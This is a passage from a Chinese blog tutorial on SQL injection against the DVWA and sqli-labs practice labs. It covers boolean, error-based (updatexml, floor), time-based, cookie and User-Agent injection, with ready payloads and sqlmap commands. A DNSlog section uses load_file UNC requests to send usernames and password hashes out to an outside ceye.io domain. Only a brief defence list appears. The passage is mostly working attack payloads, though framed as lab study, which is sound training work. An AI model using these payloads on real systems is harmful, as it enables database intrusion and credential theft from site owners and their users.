<h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><p>要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())=4,1,0)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828104043.png"></p>
<h4 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h4><p>数据库常用的字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</span><br></pre></td></tr></table></figure>

<p>一个一个试太麻烦，可以用bp抓包爆破。</p>
<p>爆破模式选择 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44431280/article/details/123412272">Cluster bomb</a> ，长度和字符设为爆破点。</p>
<p><img src="/img/20220828112113.png"></p>
<p>第一个爆破点选择numbers数字，dvwa长度为4，随便添加一个数字区间，每次+1。</p>
<p><img src="/img/20220828114343.png"></p>
<p>第二个爆破点选择自己需要的字符。</p>
<p><img src="/img/20220828115135.png"></p>
<p>然后爆破，爆破完毕，选出200状态码的正确目标。</p>
<p><img src="/img/20220828121312.png"></p>
<p><img src="/img/20220828121343.png"></p>
<p>再以Payload1排序，成功爆破出数据库名dvwa。</p>
<p><img src="/img/20220828121500.png"></p>
<p>得到库名接着获取表名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0, 1),1,1)=&#x27;g&#x27;,1,0)--+</span><br></pre></td></tr></table></figure>

<p>步骤与获取库名大同小异，limit 0,1是第一个表，limit 1,1是第二个表。</p>
<p><img src="/img/20220828124820.png"></p>
<p>成功爆破出表名guestbook和users。</p>
<p><img src="/img/20220828125135.png"></p>
<p>得到表名之后 获取字段名，limit 0,1是第一个字段，limit 1,1是第二个字段，用 burpsuite 抓包修改变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and TABLE_SCHEMA=database() limit 0,1),1,1)=&#x27;i&#x27;,1,0)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828135444.png"></p>
<p>从结果看，字段有：user_id，first_name，last_name，user，password，avatar，last_login，failed_login。</p>
<p>最后获取账号和密码：</p>
<p>先获取账号+密码的总长度。</p>
<p><code>concat()</code> 起到拼接字符的作用，括号中写多少个字符都行，以逗号分隔。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and if((SELECT length(concat(user,0x3b,password)) from users limit 1)=40,1,0)--+</span><br></pre></td></tr></table></figure>

<p>得到长度为37，0x3b是分号，占了一位，所以显示38。</p>
<p><img src="/img/20220828133242.png"></p>
<p>爆破账号密码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828141104.png"></p>
<p>整理得账号密码为admin；5f4dcc3b5aa765d61d8327deb882cf99。</p>
<h1 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3 报错注入"></a>3 报错注入</h1><p>程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，定位文件错 误。特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。 在 php 中 使用 <a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-mysqli-error.html">mysql_error()</a> 函数。如果 SQL 注入存在时，会有报错信息返回， 可以采用报错注入。</p>
<p><strong>查看dvwa的SQL注入源代码</strong></p>
<p><img src="/img/20220828164724.png"></p>
<p>如果语法错误，msqli_error()、mysqli_connect_error()会将语法错误信息 显示到 页面上。</p>
<p><img src="/img/20220828165450.png"></p>
<p>输入 1’and info()–+ 显示当前库，其实是报错函数提示当前库（爆出库名dvwa）没有info()函数。</p>
<p><img src="/img/20220828165954.png"></p>
<p><img src="/img/20220828170015.png"></p>
<p>输入构造的攻击语句，页面返回数据库信息。</p>
<h2 id="XPath语法报错"><a href="#XPath语法报错" class="headerlink" title="XPath语法报错"></a>XPath语法报错</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。 使用条件：<strong>mysql版本&gt;5.1.5</strong></p>
<h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正常语法：extractvalue(xml_document,Xpath_string);</span><br><span class="line">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class="line">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class="line">作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure>

<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
<p>常见用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&quot; and(select extractvalue(&quot;anything&quot;,concat(&#x27;~&#x27;,(注入语句))))</span><br><span class="line">id=&quot; and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))</span><br><span class="line">id=&quot; and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class="line">注：</span><br><span class="line">0x7e  是~的asccii码</span><br><span class="line">concat(‘a’,‘b’)=“ab”</span><br><span class="line">version()=@@version</span><br><span class="line">‘~‘可以换成’#’、’$&#x27;等不满足xpath格式的字符</span><br><span class="line">extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</span><br></pre></td></tr></table></figure>

<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>updatexml函数与extractvalue函数极为相似。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&#x27;and(select updatexml(&quot;anything&quot;,concat(&#x27;~&#x27;,(注入语句())),&quot;anything&quot;))</span><br></pre></td></tr></table></figure>

<p>当concat函数内拼接出的字符不符合xpath格式时，会报错，并将报错结果带回来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select updatexml(1,concat(&#x27;~&#x27;,(select database())),1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; and (select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">&#x27; and (select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">&quot; and (select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure>

<p>暗月</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and updatexml(1,concat(0x7e,version()),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828174111.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(xml_doument,XPath_string,new_value)</span><br><span class="line">第一个参数：XML的内容</span><br><span class="line">第二个参数：需要updata的位置XPath路径，XPath格式的字符串</span><br><span class="line">第三个参数：更新后的内容</span><br><span class="line">原理：</span><br><span class="line">第一、第三个参数随便写，主要是利用第二个参数，它会校验你输入的内容是否符合XPath格式，并且把校验失败的数据爆出来，其实是方便开发人员调试的。</span><br><span class="line">如何让全部的数据都校验失败呢？</span><br><span class="line">就是使用concat()在需要的数据前面加上一个XPath校验失败的东西就可以了。</span><br><span class="line">0x7e用来校验，version()是我们想要的数据，concat()用来连接它们两个。</span><br><span class="line">0x7e这个东西，它是 ~ 的16进制，不用被0x7e固定化了，只要能做到校验那填什么都可以，使用0x7e纯粹是显得比较专业。</span><br><span class="line">updatexml(1,concat(&#x27;#&#x27;,version()),1)这是#字符</span><br><span class="line">updatexml(1,concat(0x23,version()),1)这还是#字符</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,version()),1)这是~字符</span><br><span class="line">updatexml(1,concat(0x26,version()),1)这是&amp;字符</span><br><span class="line">特殊字符的16进制表：https://websitebuilders.com/tools/html-codes/ascii/</span><br></pre></td></tr></table></figure>

<p>查询数据库名和用户名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br><span class="line">1&#x27;and updatexml(1,concat(0x7e,user(),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828174605.png"></p>
<p><img src="/img/20220828174540.png"></p>
<p>但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法，每次获取 32 个字符串的长度。</p>
<p>除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>获取账户密码（需要 root 用户才有足够大的权限）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select authentication_string from mysql.user limit 1;</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828175931.png"></p>
<p>只显示了0-32位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828180448.png"></p>
<p>截取32-40位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select updatexml(1,concat(0x7e,(select substring((select authentication_string from mysql.user limit 1),32,40)),0x7e),1))--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828184200.png"></p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828190055.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828190302.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828192508.png"></p>
<h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><p>只获取了32位（算上 ~ 和逗号）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and table_schema=database())),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828191806.png"></p>
<p>接着获取后面的字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and table_schema=database()),32,64)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828192328.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and table_schema=database()),64,96)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828192922.png"></p>
<h4 id="获取用户名密码"><a href="#获取用户名密码" class="headerlink" title="获取用户名密码"></a>获取用户名密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select user from users limit 0,1)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828194632.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828194901.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),32,64)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828194930.png"></p>
<p>整理得账号密码为 admin 和 5f4dcc3b5aa765d61d8327deb882cf99（md5解密为password）。</p>
<h2 id="利用主键重复报错进行注入"><a href="#利用主键重复报错进行注入" class="headerlink" title="利用主键重复报错进行注入"></a>利用主键重复报错进行注入</h2><p><strong>报错需要满足的条件</strong>：</p>
<ul>
<li>floor()报错注入在MySQL版本8.0 已失效，经过测试7.3.4nts也已失效(据说的 本人没有实践过)</li>
<li>注入语句中查询用到的表内数据必须&gt;&#x3D;3条</li>
<li>需要用到的count(*)、floor()或者ceil()、rand()、group by</li>
</ul>
<p><strong>floor报错原理详解</strong><br>常用floor报错语句：如union联合注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select count(*),concat_ws(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,version(),floor(rand(0)*2)) as xxx from information_schema.tables group by xxx -- qqq</span></span><br></pre></td></tr></table></figure>

<p>会出现如下的报错：ERROR 1062 (23000): Duplicate entry ‘5.5.53~1’ for key ‘group_key’。</p>
<p>其他查询将version()换成想要查询的语句即可。</p>
<p>涉及的函数<br>rand()函数：随机返回0~1之间的小数。<br>floor()函数：向下取整，比如1.314，floor(1.314)为1。<br>conact_ws()函数：将括号中的数据用第一个参数连接起来。<br>group by子句：分组语句，根据一个或多个列，对结果进行分组，常与聚合函数连用，用来统计。<br>as：别名，一般会将一段长的语句进行缩短。<br>count()函数：汇总统计数量。</p>
<h3 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h3><p>采用 floor 报错并不会存在长度问题，查询第一个表名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220828200129.png"></p>
<h3 id="获取字段-1"><a href="#获取字段-1" class="headerlink" title="获取字段"></a>获取字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;users&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>

<p>使用burpsuite配合获取字段。</p>
<p><img src="/img/20220828200609.png"></p>
<p><img src="/img/20220828201137.png"></p>
<p>虽然爆破出来了，但是看着不直观，影响效率，可以过滤一下，设置网页固定内容获取。</p>
<p><img src="/img/20220828201418.png"></p>
<p><img src="/img/20220828201626.png"></p>
<p>再次攻击就会有个显示字段的列了。</p>
<p><img src="/img/20220828201757.png"></p>
<h3 id="获取账号密码"><a href="#获取账号密码" class="headerlink" title="获取账号密码"></a>获取账号密码</h3><p>现在已经获取 users 表的名字和它的字段名，接下来可以对内容进行查询。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220829165024.png"></p>
<p>如果存在多个用户，也可以配合burpsuite进行爆破。</p>
<p><img src="/img/20220829165258.png"></p>
<h1 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4 时间盲注"></a>4 时间盲注</h1><p>延时注入适用于显注和盲注，只要有延时，就能证明有注入漏洞，不用再sqlmap跑了，比较高效率。</p>
<p>时间盲注与布尔型注入的区别在于，时间注入是利用sleep()或benchmark()等函数让数据库执行的时间变长。</p>
<p>时间盲注多与if函数结合使用。如：<code>if(a,b,c)</code>，此if语句的含义是，如果a为真则返回值为b,否则返回值为c。</p>
<p>如：<code>if(length(database())&gt;1,sleep(5),1)</code>它的含义为，如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。</p>
<p>所以时间注入的本质也是布尔注入，只不过是用数据库是否延迟执行的方式来表达是与否的逻辑。</p>
<p>例子出自sqli-labs靶场的第九关。</p>
<p>正常的网页响应速度，10毫微秒。</p>
<p><img src="/img/20230606111327.png"></p>
<p>?id&#x3D;1’ and if(length(database())&gt;1,sleep(5),1)–+</p>
<p>执行sleep()函数后的响应时间，5秒。</p>
<p><img src="/img/20230606112058.png"></p>
<p>把&gt;1改为&gt;20，逻辑为否，没有延迟5秒。</p>
<p><img src="/img/20230606112430.png"></p>
<p>可以看到，一旦我们构造出结果为真的条件，网页（后端数据库）响应就会延迟。</p>
<p>我们把前文学到的盲注语句嵌入到刚刚的if、sleep组成的句子中，就可以完成接下来的注入了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>if($盲注语句，sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>用sqlmap。</p>
<p><img src="/img/20230606114138.png"></p>
<p><img src="/img/20230606114158.png"></p>
<p>爆破库名。</p>
<p><img src="/img/20230606114335.png"></p>
<p><img src="/img/20230606114349.png"></p>
<h1 id="5-cookie注入"><a href="#5-cookie注入" class="headerlink" title="5 cookie注入"></a>5 cookie注入</h1><p>当参数在cookie中，这时可以试试cookie注入。</p>
<p>以sqlib第20关为例，第一个数据包Forward之后得到的第二个数据包，可以看到参数在cookie中。</p>
<p><img src="/img/20220924231549.png"></p>
<p>把请求包保存为less20.txt，修改文件，在参数后面加个 <code>*</code>  表示让sqlmap关注这个地方。</p>
<p><img src="/img/20220924232448.png"></p>
<p>然后用sqlmap一把梭。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">slqmap.py -r less20.txt --dbms=<span class="string">&quot;mysql&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220924232821.png"></p>
<h1 id="6-User-Agent注入"><a href="#6-User-Agent注入" class="headerlink" title="6 User-Agent注入"></a>6 User-Agent注入</h1><p>以sqlib第18关为例。</p>
<p><img src="/img/20220925102708.png"></p>
<p>请求正文中的uname和passwd的值一定要是数据库中存在的用户名和对应的密码，因为这关代码会先判断数据库中是否有该用户名和密码的用户，如果有才会将User-Agent和客户端ip信息写入数据库。</p>
<p>burp抓包在User-Agent中加入引号进行测试。</p>
<p>发现浏览器存在报错，存在注入点。</p>
<p><img src="/img/20220925102743.png"></p>
<p>跟上面cookie注入大同小异，UA加*字符。sqlmap一把梭。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r less18.txt --dbms=<span class="string">&quot;mysql&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220925110852.png"></p>
<h1 id="7-dnslog-把盲注变显注"><a href="#7-dnslog-把盲注变显注" class="headerlink" title="7 dnslog:把盲注变显注"></a>7 dnslog:把盲注变显注</h1><p>dnslog可以避免一个个去猜解，能直接显示出来想要的信息。</p>
<p><strong>前提条件：</strong></p>
<ul>
<li><p>目标主机必须是Windows。dnslog注入只能用于windows平台，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个<code>\\</code>，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有<strong>unc</strong>路径，也就无法使用dnslog注入。</p>
</li>
<li><p>在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以下内容摘自百度：</span><br><span class="line">什么是UNC路径？</span><br><span class="line">UNC(Universal Naming Convention),通用命名规则</span><br><span class="line">什么是UNC路径？UNC路径就是类似\\softer这样的形式的网络路径。</span><br><span class="line">UNC为网络（主要指局域网）上资源的完整Windows 2000名称。</span><br><span class="line">格式：\\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。</span><br><span class="line">目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</span><br></pre></td></tr></table></figure>

<p>unc路径是url所以只支持数字字母下划线，如果查询到的信息带特殊字符如 <code>@</code></p>
<p>可以将查询语句后的结果进行转码，即(select database())——–&gt;hex(select database())等形式</p>
<p>盲注的时候，一个一个字符的去猜解盲注数据，线程太大容易被waf拦截，dnslog能让我们直接看到想要的信息。</p>
<p>下面这是一个域名被解析的流程，其中，红色部分是可控的。我们只需要一个红色部分的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级甚至三级域名上去请求，就可以通过DNS解析日志来获取到它们。</p>
<p><img src="/img/20220925230218.png"></p>
<p>首先，注册一个ceye.io的账号，然后看一下自己的ceye域名，比如yeuude.ceye.io，之后在此域名前随便加一个子域名，比如abcd.yeuude.ceye.io，然后ping它。</p>
<p>dnslog.cn同理。</p>
<p><img src="/img/20220925114711.png"></p>
<p>我们可以在后台看到Name一栏有我们ping的记录。dnslog就是域名的解析日志，我们域名的解析日志可以在后台看到。</p>
<p>那么我们可以构造SQL语句使得数据库发一个ping包，ping我们这个域名，比如user().yeuude.ceye.io，这样我们就可以在后台看到数据库当前用户的用户名了。</p>
<p>使用dnslog注入时，注意靶机的mysql数据库中 <code>secure_file_priv</code>，MySQL新特性secure_file_priv影响读写文件。</p>
<p>查看官方文档，secure file_priv参数用于限制LOAD DATA，SELECT…OUTFILE，LOAD FILE()传到哪个指定目录。</p>
<p>DNSLOG需要用到的load_file()函数，load_file()不仅能够加载本地文件，同时也能对诸如 <code>\\www.test.com</code> 这样的URL发起请求。</p>
<p>1、当second_file_priv没有值时，表示可以读取任意目录，不限制mysqld在任意目录的导入导出。</p>
<p>2、当secure_file_priv为<code>g:\</code>时，只能导入导出G盘的文件。</p>
<p>3、当secure_file_priv为<code>/tmp</code>时，表示限制mysqld只能在&#x2F;tmp目录中执行导入导出。</p>
<p>3、当secure_file_priv为<code>NULL</code>时，表示限制mysqld不允许导入导出，任何目录都不能被读取，load_file 不加载文件。</p>
<p>如果 null 解决如下：</p>
<p>修改 My.ini ，在 [mysqld] 下添加 secure_file_priv&#x3D;””</p>
<p><img src="/img/20220926175419.png"></p>
<p>然后重启mysql，然后查询Secure_File_Priv。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220926175443.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat(database(),&#x27;.yeuude.ceye.io&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220925224046.png"></p>
<p>使用load_file()函数发起请求。意思就是访问url <code>\\xxx.yeuude.ceye.io</code> 下的\AB，\AB是随便打的一个路径，访问不到这个东西的，但是ceye后台能显示dnslog日志。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,database(),<span class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>));</span><br><span class="line">#\\\\  有两个\用于转义，转义后代表\\</span><br><span class="line">#\\AB  有一个\用于转义，转义后代表\AB</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220925225754.png"></p>
<p>DVWA盲注。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,database(),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/20220926093440.png"></p>
<p>成功得到想要的信息。</p>
<p><img src="/img/20220926093915.png"></p>
<p>还有一个问题就是，再次使用同样的payload会触发缓存，后台没有dnslog日志，只需要换一个id参数就行了。</p>
<p>开始查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询表名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>))#</span><br><span class="line">查询字段名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select column_name from information_schema.columns where table_schema= &#x27;</span>dvwa<span class="string">&#x27; and table_name= &#x27;</span>users<span class="string">&#x27; limit 0,1),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span> <span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>))#</span><br><span class="line">查询字段的值</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 2,load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select user from dvwa.users limit 0,1),&#x27;</span>.yeuude.ceye.io\\AB<span class="string">&#x27;))#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> dvwa.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>))#</span><br></pre></td></tr></table></figure>

<p><img src="/img/20220926181828.png"></p>
<p><strong>攻击</strong></p>
<p>1.ceye.io容易被加黑名单，可以自己搭建一个dnslog服务器。</p>
<p><strong>防御</strong></p>
<p>1.黑名单：把<code>*.ceye.io</code>和<code>*dnslog.cn</code>在本地hosts文件都解析成127.0.0.1，截断数据流，让这些域名的解析都不出网不经过dns服务器。</p>
<p>2.白名单：只允许解析某些必要的域名。</p>
<p>3.看服务器出网日志：如果自己的服务器访问了一些意料之外的网站，严谨排查。</p>
<p>4.换成linux系统。</p>
<h1 id="8-二阶注入"><a href="#8-二阶注入" class="headerlink" title="8 二阶注入"></a>8 二阶注入</h1><p>在以前有一种二阶注入，注入页面和回显页面不一个页面，那时候sqlmap有一个参数叫–seconder-order，用法如下：</p>
